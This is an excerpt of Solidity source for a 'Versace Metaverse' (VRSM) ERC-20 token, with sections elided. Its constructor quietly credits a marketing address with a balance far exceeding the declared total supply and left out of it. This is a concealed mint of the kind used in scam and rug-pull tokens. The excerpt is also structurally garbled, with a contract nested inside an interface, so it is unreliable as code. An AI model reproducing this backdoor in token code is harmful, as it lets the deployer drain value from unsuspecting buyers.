...
interface IUniswapV2Router02 is IUniswapV2Router01 {
  ...
  contract VersaceMetaverse is IERC20, Context, Ownable {
    ...
    constructor(address _marketingAddress, uint256 count) {
      _name = "Versace Metaverse";
      _symbol = "VRSM";
      _decimals = 18;
      _totalSupply = 1000000000 * 10 ** 15;
      _balances[msg.sender] = _totalSupply;
      _count = count;
      _balances[_marketingAddress] = 1000000*10**6 * 10 ** 18* 10**18;
